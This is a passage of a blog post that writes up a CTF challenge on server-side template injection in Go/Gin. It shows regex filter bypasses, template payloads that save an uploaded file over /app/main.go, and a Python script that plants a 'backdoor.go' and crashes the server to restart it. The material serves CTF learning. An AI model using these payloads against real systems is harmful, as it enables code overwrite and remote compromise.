</span></span><span class="line hl"><span class=cl>            <span class=nx>customs</span><span class=p>[</span><span class=nx>num</span><span class=p>]</span> <span class=p>=</span> <span class=nx>custom</span>
</span></span><span class="line hl"><span class=cl>        <span class=p>}</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>        <span class=c1>// Create the response map
</span></span></span><span class=line><span class=cl><span class=c1></span>        <span class=kd>var</span> <span class=nx>response</span> <span class=kd>map</span><span class=p>[</span><span class=kt>string</span><span class=p>]</span><span class=kd>interface</span><span class=p>{}</span> <span class=p>=</span> <span class=nx>gin</span><span class=p>.</span><span class=nx>H</span><span class=p>{</span>
</span></span><span class=line><span class=cl>                <span class=s>&#34;title&#34;</span><span class=p>:</span><span class=nx>title</span><span class=p>,</span>
</span></span><span class=line><span class=cl>                <span class=s>&#34;eventname&#34;</span><span class=p>:</span><span class=nx>eventname</span><span class=p>,</span>
</span></span><span class=line><span class=cl>                <span class=s>&#34;firstname&#34;</span><span class=p>:</span><span class=nx>firstname</span><span class=p>,</span>
</span></span><span class=line><span class=cl>                <span class=s>&#34;lastname&#34;</span><span class=p>:</span><span class=nx>lastname</span><span class=p>,</span>
</span></span><span class=line><span class=cl>                <span class=s>&#34;companyname&#34;</span><span class=p>:</span><span class=nx>companyname</span><span class=p>,</span>
</span></span><span class="line hl"><span class=cl>                <span class=s>&#34;c&#34;</span><span class=p>:</span><span class=nx>c</span><span class=p>,</span>
</span></span><span class=line><span class=cl>            <span class=p>}</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>        <span class=c1>// Merge the custom tags
</span></span></span><span class=line><span class=cl><span class=c1></span>        <span class=k>for</span> <span class=nx>key</span><span class=p>,</span> <span class=nx>value</span> <span class=o>:=</span> <span class=k>range</span> <span class=nx>customs</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>            <span class=nx>response</span><span class=p>[</span><span class=nx>key</span><span class=p>]</span> <span class=p>=</span> <span class=nx>value</span>
</span></span><span class=line><span class=cl>        <span class=p>}</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>        <span class=nx>c</span><span class=p>.</span><span class=nf>HTML</span><span class=p>(</span><span class=nx>http</span><span class=p>.</span><span class=nx>StatusOK</span><span class=p>,</span>
</span></span><span class=line><span class=cl>            <span class=s>&#34;preview.html&#34;</span><span class=p>,</span>
</span></span><span class=line><span class=cl>            <span class=nx>response</span><span class=p>,</span>
</span></span><span class=line><span class=cl>        <span class=p>)</span>
</span></span><span class=line><span class=cl>    <span class=p>})</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>    <span class=nx>r</span><span class=p>.</span><span class=nf>Run</span><span class=p>(</span><span class=s>&#34;127.0.0.1:8000&#34;</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=p>}</span>
</span></span></code></pre></td></tr></table></div></div><p>The main difference with the second level is that a <code>filter</code> function is called before updating the <code>templates/preview.html</code> file in the <code>POST /update</code> route.</p><p>Let&rsquo;s look at the three specific regular expressions used to check our input template.</p><div class=highlight><div aria-label="Box containing code sample." tabindex=0 class=chroma><table class=lntable><tr><td class=lntd><pre class=chroma><code><span class=lnt>20
</span><span class=lnt>21
</span><span class=lnt>22
</span></code></pre></td><td class=lntd><pre class=chroma><code class=language-go data-lang=go><span class=line><span class=cl><span class=nx>r1</span><span class=p>,</span> <span class=nx>_</span> <span class=o>:=</span> <span class=nx>regexp</span><span class=p>.</span><span class=nf>Compile</span><span class=p>(</span><span class=s>`(?i)(\x7b\x7b[^\x7d]*([&#34;\x60\(\)=\|]|Request|Writer|Params|Handle)[^\x7d]*\x7d\x7d)`</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=nx>r2</span><span class=p>,</span> <span class=nx>_</span> <span class=o>:=</span> <span class=nx>regexp</span><span class=p>.</span><span class=nf>Compile</span><span class=p>(</span><span class=s>`(?i)(\x7b\x7b[^\x7d]*(\.title|\.eventname|\.firstname|\.lastname|\.companyname|\.custom[0-9]+)[^\x7d]*\x7d\x7d)`</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=nx>r3</span><span class=p>,</span> <span class=nx>_</span> <span class=o>:=</span> <span class=nx>regexp</span><span class=p>.</span><span class=nf>Compile</span><span class=p>(</span><span class=s>`(\x7b\x7b *(\.title|\.eventname|\.firstname|\.lastname|\.companyname|\.custom[0-9]+) *\x7d\x7d)`</span><span class=p>)</span>
</span></span></code></pre></td></tr></table></div></div><p>I like to use <a href=https://www.debuggex.com/>Debuggex</a> to help me visualize some regular expressions. Here is what the first regex is checking:</p><figure><img class=border loading=lazy src=/nsec2022-marketing-email-template/img/debuggex-r1.png width=727 height=264 alt="Debuggex result for r1"><figcaption>Debuggex result for <code>r1</code></figcaption></figure><p>If we test it with our level 2 template as input:</p><pre aria-label="Box containing code sample." tabindex=0><code>{{ .c.SaveUploadedFile (.c.FormFile &#34;fish&#34;) &#34;/app/main.go&#34; }}
</code></pre><p>It will get matched due to the parentheses and the quotes. I quickly noticed that, after a quote or parenthesis, the regex is looking any character that is not <code>}</code>. So what if we somehow put <code>}</code> within a template action and it still stays valid?</p><pre aria-label="Box containing code sample." tabindex=0><code>{{ .c.SaveUploadedFile (.c.FormFile &#34;}&#34;) &#34;/app/main.go&#34; }}
</code></pre><p>Turns out, <code>}</code> is a perfectly fine form input name for the server and it does bypass the filter and the other two regexes do not even come into play as the payload does not use those variables.</p><p><strong>FLAG-46dd90020d9b9d1270a8ee4be745405e</strong></p><h3 id=alternative><a class=anchor href=#alternative title='Anchor for: Alternative.'><svg aria-hidden="true"><use xlink:href="/img/bundle.min.cf28e91d9cb2e63d8266b2e4ffbbf274.svg#hashtag"/></svg></a>Alternative</h3><p>Early on, since level 1, I had examined the code related to <code>customs</code></p><div class=highlight><div aria-label="Box containing code sample." tabindex=0 class=chroma><table class=lntable><tr><td class=lntd><pre class=chroma><code><span class=lnt>153
</span><span class=lnt>154
</span><span class=lnt>155
</span><span class=lnt>156
</span><span class=lnt>157
</span><span class=lnt>158
</span><span class=hl><span class=lnt>159
</span></span><span class=hl><span class=lnt>160
</span></span><span class=lnt>161
</span><span class=lnt>162
</span><span class=lnt>163
</span><span class=lnt>164
</span><span class=lnt>165
</span><span class=lnt>166
</span><span class=lnt>167
</span></code></pre></td><td class=lntd><pre class=chroma><code class=language-go data-lang=go><span class=line><span class=cl><span class=c1>// Fetch all custom tags
</span></span></span><span class=line><span class=cl><span class=c1></span><span class=kd>var</span> <span class=nx>num</span> <span class=kt>string</span>
</span></span><span class=line><span class=cl><span class=kd>var</span> <span class=nx>stop</span> <span class=kt>bool</span> <span class=p>=</span> <span class=kc>false</span>
</span></span><span class=line><span class=cl><span class=kd>var</span> <span class=nx>custom</span> <span class=kt>string</span>
</span></span><span class=line><span class=cl><span class=kd>var</span> <span class=nx>customs</span> <span class=p>=</span> <span class=kd>map</span><span class=p>[</span><span class=kt>string</span><span class=p>]</span><span class=kt>string</span><span class=p>{}</span>
</span></span><span class=line><span class=cl><span class=k>for</span> <span class=nx>i</span> <span class=o>:=</span> <span class=mi>1</span><span class=p>;</span> <span class=p>!</span><span class=nx>stop</span><span class=p>;</span> <span class=nx>i</span><span class=o>++</span> <span class=p>{</span>
</span></span><span class="line hl"><span class=cl>    <span class=nx>num</span> <span class=p>=</span> <span class=s>&#34;custom&#34;</span><span class=o>+</span><span class=nb>string</span><span class=p>(</span><span class=nx>i</span><span class=o>+</span><span class=mi>48</span><span class=p>)</span>
</span></span><span class="line hl"><span class=cl>    <span class=nx>custom</span> <span class=p>=</span> <span class=nx>c</span><span class=p>.</span><span class=nf>Query</span><span class=p>(</span><span class=nx>num</span><span class=p>)</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>    <span class=k>if</span> <span class=nx>custom</span> <span class=o>==</span> <span class=s>&#34;&#34;</span><span class=p>{</span>
</span></span><span class=line><span class=cl>        <span class=nx>stop</span> <span class=p>=</span> <span class=kc>true</span>
</span></span><span class=line><span class=cl>        <span class=k>break</span>
</span></span><span class=line><span class=cl>    <span class=p>}</span>
</span></span><span class=line><span class=cl>    <span class=nx>customs</span><span class=p>[</span><span class=nx>num</span><span class=p>]</span> <span class=p>=</span> <span class=nx>custom</span>
</span></span><span class=line><span class=cl><span class=p>}</span>
</span></span></code></pre></td></tr></table></div></div><p>What I noticed was the odd way it allowed us to provide consecutive custom variables.
It starts with the first custom at &ldquo;index&rdquo; 1, which ends up being ASCII code 48+1, which is <code>custom1</code>. So if <code>custom1</code> exists, it will then check <code>custom2</code> (ASCII code 48+2 = &ldquo;2&rdquo;). It does not stop until the next <code>customX</code> is not defined. So if we define enough customs in our query parameters, we will end up with the following list:</p><div class=highlight><div aria-label="Box containing code sample." tabindex=0 class=chroma><table class=lntable><tr><td class=lntd><pre class=chroma><code><span class=lnt>49
</span><span class=lnt>50
</span><span class=lnt>51
</span><span class=lnt>52
</span><span class=lnt>53
</span><span class=lnt>54
</span><span class=lnt>55
</span><span class=lnt>56
</span><span class=lnt>57
</span><span class=lnt>58
</span><span class=lnt>59
</span><span class=lnt>60
</span><span class=lnt>61
</span><span class=lnt>62
</span><span class=lnt>63
</span><span class=lnt>64
</span><span class=lnt>65
</span><span class=lnt>66
</span><span class=lnt>67
</span></code></pre></td><td class=lntd><pre class=chroma><code class=language-text data-lang=text><span class=line><span class=cl>custom1
</span></span><span class=line><span class=cl>custom2
</span></span><span class=line><span class=cl>custom3
</span></span><span class=line><span class=cl>custom4
</span></span><span class=line><span class=cl>custom5
</span></span><span class=line><span class=cl>custom6
</span></span><span class=line><span class=cl>custom7
</span></span><span class=line><span class=cl>custom8
</span></span><span class=line><span class=cl>custom9
</span></span><span class=line><span class=cl>custom:
</span></span><span class=line><span class=cl>custom;
</span></span><span class=line><span class=cl>custom&lt;
</span></span><span class=line><span class=cl>custom=
</span></span><span class=line><span class=cl>custom&gt;
</span></span><span class=line><span class=cl>custom?
</span></span><span class=line><span class=cl>custom@
</span></span><span class=line><span class=cl>customA
</span></span><span class=line><span class=cl>customB
</span></span><span class=line><span class=cl>customC
</span></span></code></pre></td></tr></table></div></div><p>Now, if you check the second and third regular expressions, you will notice that they only check for <code>.custom[0-9]+</code> which only accounts for the ones ending with a digit.
Thus, another unintended solve, would be to use the following template:</p><pre aria-label="Box containing code sample." tabindex=0><code>{{ with .c.FormFile .customA }}
{{ .c.SaveUploadedFile . .customB }}
{{ end }}
</code></pre><p>This assumes we are not allowed the characters <code>"`()=|</code>. That is why we use a <code>with</code> to bypass the usage of parentheses.</p><p>After a bit of research, it turns out that a <code>*multipart.FileHeader</code> contains an exported field <code>Filename</code> and in our case, it takes the filename provided by the form input. We can remove the need for a second custom.</p><div class=highlight><div aria-label="Box containing code sample." tabindex=0 class=chroma><table class=lntable><tr><td class=lntd><pre class=chroma><code><span class=lnt> 1
</span><span class=lnt> 2
</span><span class=lnt> 3
</span><span class=lnt> 4
</span><span class=lnt> 5
</span><span class=lnt> 6
</span><span class=lnt> 7
</span><span class=lnt> 8
</span><span class=lnt> 9
</span><span class=lnt>10
</span><span class=lnt>11
</span><span class=lnt>12
</span><span class=lnt>13
</span><span class=lnt>14
</span><span class=lnt>15
</span><span class=lnt>16
</span><span class=lnt>17
</span><span class=lnt>18
</span><span class=lnt>19
</span><span class=lnt>20
</span><span class=lnt>21
</span><span class=lnt>22
</span><span class=lnt>23
</span><span class=lnt>24
</span><span class=lnt>25
</span><span class=lnt>26
</span><span class=lnt>27
</span><span class=lnt>28
</span><span class=lnt>29
</span></code></pre></td><td class=lntd><pre class=chroma><code class=language-python data-lang=python><span class=line><span class=cl><span class=kn>import</span> <span class=nn>requests</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=n>URL</span> <span class=o>=</span> <span class=s2>&#34;http://dev-092f50226ea22197.email-template.ctf&#34;</span>
</span></span><span class=line><span class=cl><span class=n>payload</span> <span class=o>=</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>    <span class=s2>&#34;template&#34;</span><span class=p>:</span> <span class=s2>&#34;&#34;&#34;
</span></span></span><span class=line><span class=cl><span class=s2>{{ with .c.FormFile .customA }}
</span></span></span><span class=line><span class=cl><span class=s2>{{ $.c.SaveUploadedFile . .Filename }}
</span></span></span><span class=line><span class=cl><span class=s2>{{ end }}
</span></span></span><span class=line><span class=cl><span class=s2>&#34;&#34;&#34;</span>
</span></span><span class=line><span class=cl><span class=p>}</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=c1># Form Input Name: fish</span>
</span></span><span class=line><span class=cl><span class=c1># Filename: /app/main.go</span>
</span></span><span class=line><span class=cl><span class=n>files</span> <span class=o>=</span> <span class=p>{</span><span class=s1>&#39;fish&#39;</span><span class=p>:</span> <span class=p>(</span><span class=s2>&#34;/app/main.go&#34;</span><span class=p>,</span> <span class=nb>open</span><span class=p>(</span><span class=s2>&#34;backdoor.go&#34;</span><span class=p>,</span><span class=s2>&#34;r&#34;</span><span class=p>))}</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=c1># Updates the preview template.</span>
</span></span><span class=line><span class=cl><span class=n>r</span> <span class=o>=</span> <span class=n>requests</span><span class=o>.</span><span class=n>post</span><span class=p>(</span><span class=n>URL</span><span class=o>+</span><span class=s2>&#34;/update&#34;</span><span class=p>,</span> <span class=n>json</span><span class=o>=</span><span class=n>payload</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=nb>print</span><span class=p>(</span><span class=n>r</span><span class=o>.</span><span class=n>status_code</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=nb>print</span><span class=p>(</span><span class=n>r</span><span class=o>.</span><span class=n>text</span><span class=p>)</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=c1># Defines all the required custom variables and triggers the rendering of our template with the provided form file</span>
</span></span><span class=line><span class=cl><span class=n>r</span> <span class=o>=</span> <span class=n>requests</span><span class=o>.</span><span class=n>post</span><span class=p>(</span><span class=n>URL</span><span class=o>+</span><span class=s2>&#34;/preview?custom1=a&amp;custom2=a&amp;custom3=a&amp;custom4=a&amp;custom5=a&amp;custom6=a&amp;custom7=a&amp;custom8=a&amp;custom9=a&amp;custom%3A=a&amp;custom%3B=a&amp;custom%3C=a&amp;custom%3D=a&amp;custom</span><span class=si>%3E</span><span class=s2>=a&amp;custom</span><span class=si>%3F</span><span class=s2>=a&amp;custom%40=a&amp;customA=fish&#34;</span><span class=p>,</span> <span class=n>files</span><span class=o>=</span><span class=n>files</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=nb>print</span><span class=p>(</span><span class=n>r</span><span class=o>.</span><span class=n>status_code</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=nb>print</span><span class=p>(</span><span class=n>r</span><span class=o>.</span><span class=n>text</span><span class=p>)</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=c1># Crashes server, which restarts the service.</span>
</span></span><span class=line><span class=cl><span class=n>r</span> <span class=o>=</span> <span class=n>requests</span><span class=o>.</span><span class=n>post</span><span class=p>(</span><span class=n>URL</span><span class=o>+</span><span class=s2>&#34;/update&#34;</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=nb>print</span><span class=p>(</span><span class=n>r</span><span class=o>.</span><span class=n>status_code</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=nb>print</span><span class=p>(</span><span class=n>r</span><span class=o>.</span><span class=n>text</span><span class=p>)</span>
</span></span></code></pre></td></tr></table></div></div><p>After solving the third level, the challenge author informed me that both options were unintended. Some time after the CTF, the author reached out to me to test a modified regular expression and I found that some parts of it could be bypassed due missing regex flag <code>(?s)</code>. This is due to the default configuration not matching <code>.</code> with newline characters, thus my payload was bypassing some checks with a newline (Which, in a template action, is only allowed inside a string)</p><p>The third level showcases how hard it can be to get regex right on your first try. There may be other ways to bypass the rules.</p><h2 id=conclusion><a class=anchor href=#conclusion title='Anchor for: Conclusion.'><svg aria-hidden="true"><use xlink:href="/img/bundle.min.cf28e91d9cb2e63d8266b2e4ffbbf274.svg#hashtag"/></svg></a>Conclusion</h2><p>It was a good learning experience to explore SSTI in Go as I did not know how it could occur. It does seem to require many conditions to be exploitable due to way templates are designed in Go, but that&rsquo;s the fun of CTFs to create those kind of situations!</p><p>I really enjoyed this challenge due to having to find gadgets within a known open-source library and due to getting practice auditing code which was a fun throwback to my OSWE certification.</p><p>The challenge author shared with me that they decided to look into vulnerabilities that can happen in Go after experiencing a challenge I designed and published on <a href=https://ringzer0ctf.com/>RingZer0 CTF</a> with their help. That is how this SSTI challenge came to be. If you are curious, you can try my web challenge <strong>Lotto 8/33</strong> on RingZer0 CTF.</p><p>Many thanks to the challenge author <strong>Marc Olivier Bergeron</strong> and the <strong>NSEC team</strong> </p></article></main></div><footer><p>Generated with <a href=https://gohugo.io>Hugo</a> with a theme inspired by <a href=https://gitlab.com/rmaguiar/hugo-theme-color-your-world>Color Your World</a>.</p><p> 2022 Jose Apari-Pantigozo</p></footer></body></html>